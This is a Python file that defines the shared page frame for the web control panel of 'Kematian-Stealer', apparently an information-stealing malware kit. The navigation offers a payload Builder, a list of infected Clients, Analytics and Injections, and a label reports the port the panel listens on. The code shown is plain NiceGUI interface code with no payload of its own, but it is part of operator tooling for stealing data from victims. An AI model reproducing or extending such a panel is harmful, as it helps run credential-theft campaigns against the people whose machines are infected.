import os

from contextlib import contextmanager

from panel.ui.media.images import Images
from panel.ui.modules.settings.settings import Settings

from nicegui import ui


@contextmanager
def frame(full_size: bool = False):
    """Custom page frame to share the same styling and behavior across all pages"""
    dark = ui.dark_mode()
    dark.enable()
    ui.colors(
        primary="#24447f", secondary="#53B689", accent="#111B1E", positive="#53B689"
    )
    ui.page_title("Kematian-Stealer")

    with ui.left_drawer().classes(
        "flex flex-col justify-between items-center h-full w-full"
    ).props("background-color: rgba(36, 68, 127, 0.5);") as left_drawer:
        with ui.column().props("vertical inline-label indicator-color='blue'").classes(
            "justify-center items-center space-y-4 h-full overflow-auto w-full justify-between"
        ) as _:
            ui.image(Images.get_image("Kematian")).classes(
                "space-y-2 rounded-lg"
            ).style("max-width: 200px; max-height: 200px;")

            ui.label(f"Listening on port: {Settings().get_setting('port')}").classes(
                "text-white text-lg"
            )

            buttons = [
                ("Home", "/", "home"),
                ("Builder", "/builder", "build"),
                ("Clients", "/clients", "groups"),
                ("Analytics", "/analytics", "analytics"),
                ("Injections", "/injections", "vaccines"),
                ("Settings", "/settings", "settings"),
                ("Credits", "/credits", "engineering"),
            ]

            for button_text, button_path, button_icon in buttons:
                ui.button(
                    button_text,
                    on_click=lambda path=button_path: ui.navigate.to(path),
                    icon=button_icon,
                ).classes("w-full py-4 text-lg pb-5 rounded-lg")

    with ui.header().classes(replace="row items-center"):
        ui.button(on_click=lambda: left_drawer.toggle(), icon="menu").props(
            "flat color=white"
        )
        ui.label("Kematian-Stealer").classes(
            "text-white text-2xl justify-center mx-auto"
        )
        ui.button(on_click=lambda: exit_everything(), icon="power_settings_new").props(
            "flat color=white"
        )

    with ui.column().classes(
        "absolute-center items-center flex-grow p-4 overflow-auto"
        + (" h-full w-full" if full_size else "")
    ):
        yield


def exit_everything():
    os._exit(0)
